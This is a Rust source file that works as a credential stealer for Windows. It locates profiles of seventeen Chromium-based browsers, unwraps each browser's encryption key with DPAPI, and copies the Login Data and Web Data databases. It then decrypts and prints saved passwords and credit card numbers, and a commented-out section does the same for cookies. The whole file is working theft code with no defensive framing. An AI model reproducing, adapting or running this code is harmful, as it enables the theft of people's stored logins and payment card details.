#![allow(unused)]
#![warn(deprecated)]

use std::env;
use std::fs;
use std::io;
use std::path::Path;
use std::ptr::{null, null_mut};
use aes_gcm::aead::{generic_array::GenericArray, Aead, KeyInit, Payload};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::prelude::*;
use hex;
use regex::Regex;
use rusqlite::{types::ValueRef, Connection, Result};
use serde_json::Value;
use winapi::shared::minwindef::{DWORD, HLOCAL};
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::winbase::LocalFree;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;

fn get_paths() -> Vec<(String, String)> {
  let home_directory = env::var("HOME")
    .or_else(|_| env::var("USERPROFILE"))
    .unwrap_or_else(|_| "Impossible to get your home dir!".to_string());

  let browsers_path = format!("{}\\AppData\\Local", home_directory);

  let browser_paths = [
    ("avast", format!("{}\\AVAST Software\\Browser\\User Data", browsers_path)),
    ("amigo", format!("{}\\Amigo\\User Data", browsers_path)),
    ("torch", format!("{}\\Torch\\User Data", browsers_path)),
    ("kometa", format!("{}\\Kometa\\User Data", browsers_path)),
    ("orbitum", format!("{}\\Orbitum\\User Data", browsers_path)),
    ("cent-browser", format!("{}\\CentBrowser\\User Data", browsers_path)),
    ("7star", format!("{}\\7Star\\7Star\\User Data", browsers_path)),
    ("sputnik", format!("{}\\Sputnik\\Sputnik\\User Data", browsers_path)),
    ("vivaldi", format!("{}\\Vivaldi\\User Data", browsers_path)),
    ("google-chrome-sxs", format!("{}\\Google\\Chrome SxS\\User Data", browsers_path)),
    ("google-chrome", format!("{}\\Google\\Chrome\\User Data", browsers_path)),
    ("epic-privacy-browser", format!("{}\\Epic Privacy Browser\\User Data", browsers_path)),
    ("microsoft-edge", format!("{}\\Microsoft\\Edge\\User Data", browsers_path)),
    ("uran", format!("{}\\uCozMedia\\Uran\\User Data", browsers_path)),
    ("yandex", format!("{}\\Yandex\\YandexBrowser\\User Data", browsers_path)),
    ("brave", format!("{}\\BraveSoftware\\Brave-Browser\\User Data", browsers_path)),
    ("iridium", format!("{}\\Iridium\\User Data", browsers_path)),
  ];

  browser_paths
    .iter()
    .filter_map(|(_name, path)| {
      let local_state_path = format!("{}\\Local State", path);
      if Path::new(&local_state_path).exists() {
        Some((local_state_path, path.clone()))
      } else {
        None
      }
    })
    .collect()
}

fn get_secret_key(chrome_path_local_state: &str) -> Result<String, Box<dyn std::error::Error>> {
  let file_content = fs::read_to_string(chrome_path_local_state)?;
  let v: Value = serde_json::from_str(&file_content)?;

  let key_base64 = v["os_crypt"]["encrypted_key"]
    .as_str()
    .ok_or("No key found")?;
  let mut key_bytes = BASE64_STANDARD.decode(key_base64)?;

  // Remove the DPAPI prefix (first 5 bytes)
  key_bytes.drain(0..5);

  // Prepare the input structure for CryptUnprotectData
  let mut blob_in = CRYPTOAPI_BLOB {
    cbData: key_bytes.len() as u32,
    pbData: key_bytes.as_mut_ptr(),
  };

  // Prepare the output structure for CryptUnprotectData
  let mut blob_out = CRYPTOAPI_BLOB {
    cbData: 0,
    pbData: null_mut(),
  };

  // Decrypt the key bytes
  let result = unsafe {
    CryptUnprotectData(
      &mut blob_in,
      null_mut(),
      null_mut(),
      null_mut(),
      null_mut(),
      0,
      &mut blob_out,
    )
  };

  if result == 0 {
    return Err("Failed to decrypt data".into());
  }

  // Extract the decrypted data
  let decrypted_key =
    unsafe { std::slice::from_raw_parts(blob_out.pbData, blob_out.cbData as usize) }.to_vec();

  // Free the memory allocated by CryptUnprotectData
  unsafe {
    LocalFree(blob_out.pbData as HLOCAL);
  }

  // Convert to a hex string for display
  let key_hex = hex::encode(decrypted_key);
  Ok(key_hex)
}

fn get_db_connection(chrome_path_login_db: &str) -> Option<Connection> {
  if let Err(e) = fs::copy(chrome_path_login_db, "Loginvault.db") {
    eprintln!("{}", e);
    eprintln!("[ERR] Chrome database cannot be found");
    return None;
  }

  match Connection::open("Loginvault.db") {
    Ok(conn) => Some(conn),
    Err(e) => {
      eprintln!("{}", e);
      eprintln!("[ERR] Chrome database cannot be found");
      None
    }
  }
}

fn aes_gcm_256(key_buf: &mut [u8], pwd_buf: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
  let key = GenericArray::from_slice(key_buf);
  let cipher = Aes256Gcm::new(key);
  let nonce = GenericArray::from_slice(&pwd_buf[3..15]);
  let payload = Payload {
    msg: &pwd_buf[15..],
    aad: &[],
  };
  let plaintext = cipher
    .decrypt(nonce, payload)
    .map_err(|e| format!("Decryption failed: {}", e))?;

  let plaintext_str =
    String::from_utf8(plaintext).map_err(|e| format!("Invalid UTF-8 sequence: {}", e))?;
  Ok(plaintext_str)
}

fn query_data(conn: &Connection, secret_key: &str, query: &str, columns: &[(&str, &str)]) {
  let mut stmt = conn.prepare(query).unwrap();
  let mut rows = stmt.query([]).unwrap();

  while let Some(row) = rows.next().unwrap() {
    let mut results: Vec<String> = vec![];

    for (i, column) in columns.iter().enumerate() {
      if *column.1 == *"Encrypted" {
        let encrypted_value: Vec<u8> = row.get(i).unwrap();
        let mut key_bytes = hex::decode(secret_key).expect("Invalid hex in secret key");
        let decrypted_value =
            aes_gcm_256(&mut key_bytes, &encrypted_value).unwrap_or_else(|e| {
              eprintln!("[ERR] Unable to decrypt value: {}", e);
              String::new()
            });
        results.push(decrypted_value);
      } else {
        match row.get_ref(i).unwrap() {
          ValueRef::Text(value) => {
            results.push(String::from_utf8(value.to_vec()).unwrap())
          }
          ValueRef::Integer(value) => results.push(value.to_string()),
          ValueRef::Real(value) => results.push(value.to_string()),
          ValueRef::Null => results.push("NULL".to_string()),
          _ => results.push("Unsupported type".to_string()),
        }
      }
    }
    println!("{:?}", results);
  }
}

fn main() -> io::Result<()> {
  let data_queries = vec![
    (
      "logins",
      "SELECT action_url, username_value, password_value FROM logins",
      "Login Data",
      [("URL", "Text"), ("Email", "Text"), ("Password", "Encrypted")].as_slice(),
    ),
    (
      "credit_cards",
      "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year, date_modified FROM credit_cards",
      "Web Data",
      [("Name On Card", "Text"), ("Card Number", "Encrypted"), ("Expires On", "Integer"), ("Expiration Year", "Integer"), ("Added On", "Integer")].as_slice(),
    ),
    // Uncomment this to get cookies
    // (
    //   "cookies",
    //   "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies",
    //   "Network\\Cookies",
    //   [("Host Key", "Text"), ("Cookie Name", "Text"), ("Path", "Text"), ("Cookie", "Encrypted"), ("Expires On", "Integer")].as_slice(),
    // ),
  ];

  let browser_paths = get_paths();

  for (local_state_path, browser_path) in browser_paths {
    println!("\nProcessing: {}", browser_path);

    let secret_key = match get_secret_key(&local_state_path) {
      Ok(secret_key) => secret_key,
      Err(_) => {
        eprintln!("Failed to get secret key for: {}", browser_path);
        continue;
      }
    };

    let pattern = Regex::new(r"^Profile.*|^Default$").unwrap();

    let folders: Vec<String> = fs::read_dir(&browser_path)?
      .filter_map(|entry| {
        let entry = entry.ok()?;
        let entry_name = entry.file_name().into_string().ok()?;
        if pattern.is_match(&entry_name) {
          Some(entry_name)
        } else {
          None
        }
      })
      .collect();

    for folder in folders {
      for (query_name, query, db_file, columns) in &data_queries {
        let db_path = format!("{}\\{}\\{}", browser_path, folder, db_file);
        if Path::new(&db_path).exists() {
          if let Some(conn) = get_db_connection(&db_path) {
            println!("Executing query '{}' for {}", query_name, db_file);

            if !secret_key.is_empty() {
              query_data(&conn, &secret_key, query, columns);
            }

            drop(conn);
            fs::remove_file("Loginvault.db")?;
          }
        } else {
          eprintln!(
            "[WARN] Database file '{}' not found for '{}'",
            db_file, folder
          );
        }
      }
    }
  }
  Ok(())
}
